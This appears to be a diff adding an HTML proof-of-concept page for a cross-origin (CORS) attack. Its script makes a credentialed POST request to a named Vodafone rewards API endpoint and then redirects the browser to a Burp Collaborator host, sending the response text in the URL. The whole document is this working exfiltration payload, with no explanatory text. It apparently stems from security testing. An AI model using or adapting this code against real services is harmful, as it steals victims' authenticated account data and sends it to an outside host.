@@ -1,0 +1,16 @@
+<html>
+<body>
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('POST','https://ms.rewards.aws.cps.vodafone.com/rewards/getFavorites',true);
+req.withCredentials = true;
+req.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+req.send(JSON.stringify({}));
+
+function reqListener() {
+location='https://fve62qlfx3w1t7goldxayutgu70xom.burpcollaborator.net/log?key='+this.responseText;
+};
+</script>
+</body>
+</html>
